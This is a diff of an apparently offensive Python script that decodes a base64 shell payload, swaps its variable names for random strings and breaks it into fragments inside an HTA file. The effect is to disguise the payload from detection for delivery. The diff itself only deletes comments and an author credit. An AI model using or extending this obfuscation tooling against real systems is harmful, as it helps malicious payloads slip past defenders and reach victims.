@@ -12,7 +12,6 @@ def decodbs64():
    getFileWithoutNull=base64.b64decode(ReadShell).replace("\00", "")
    obfASW(getFileWithoutNull)
 
-#return textwrap.fill(s, w)
 def wrap(s, w):
     filename = "fragFile"
     fragFile = open(filename, "w")
@@ -22,13 +21,10 @@ def obfASW(getFileWithoutNullT):
    time.sleep(2)
    randomNumber=random.randint(1,60)
    genStrOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumber))
-   #print test
    roundNone=getFileWithoutNullT.replace("$b", "$"+genStrOne)
-   #print roundNone
    randomNumber2=random.randint(1,40)
    genStrTwo=''.join(random.choice(string.ascii_letters) for x in range(randomNumber2))
    roundNTwo=roundNone.replace("$s", "$"+genStrTwo)
-   #print roundNTwo
    randomNumber3=random.randint(1,39)
    genStrThree=''.join(random.choice(string.ascii_letters) for x in range(randomNumber3))
    roundNThree=roundNTwo.replace("$p", "$"+genStrThree)
@@ -42,13 +38,12 @@ def retrunNulls(roundNThreeT):
    wrap(shellReady,10)
    time.sleep(4)
    buildFrag()
- #  time.sleep(4)
 
 def buildFrag():
    count=0
    var0=""
    buildFrag = open("buildFrag", "w")
-#Frags=buildFrag.read()
+
    with open('fragFile') as f:
       for line in f:
           if count != 0 :
@@ -59,15 +54,12 @@ def buildFrag():
           var0=line
    time.sleep(10)
    ProcessCompleted(count)
-#Coded By AbedAlqader Swedan
+
 def ProcessCompleted(count):
    replaceHta = open("htafile.hta", "r")
    readHta=replaceHta.read()
   
-   #print "I am COunt {}".format(count)
    
-   #readFragFromFile = open("buildFrag", "r")
-   #dataFragsxxx=readFragFromFile.read()
 
    randomNumberV=random.randint(3,42)
    genVarOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))
@@ -76,9 +68,7 @@ def ProcessCompleted(count):
    roundNTwoV=roundNOneV.replace("Two", genVarOne)
 
    time.sleep(5)
-   #print "Facebook"+dataFragsxxx
-   #roundNThreeV=roundNTwoV.replace("Fa0CB0Ok",dataFragsxxx)
-   #print "Facebook"+roundNThreeV
+   
    roundNThreeVG=roundNTwoV.replace("Go0Gole","var{}".format(count-1))
 
    randomNumberZ=random.randint(5,19)
